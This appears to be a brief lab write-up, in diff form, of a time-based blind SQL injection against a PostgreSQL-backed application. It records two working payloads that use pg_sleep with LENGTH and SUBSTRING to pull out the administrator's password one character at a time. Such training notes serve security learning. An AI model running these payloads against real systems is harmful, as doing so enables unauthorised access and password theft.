@@ -1,0 +1,10 @@
+so for this lab, i am to extract the password for the administrator user. 
+i can use time delay. using the mighty substring function again. I can check if the letter in a position is correct then it sleeps for 10 seconds
+
+first i check the length of the password. I use the same analogy but with the length function. I crafted this payload. I had a guess the database was PostgreSQL
+' AND (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator') IS NULL--
+
+it responded about 10 seconds later confirming the password is indeed 20 charcters 
+
+then i feed this payload i crafted into intruder
+' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator') IS NULL--
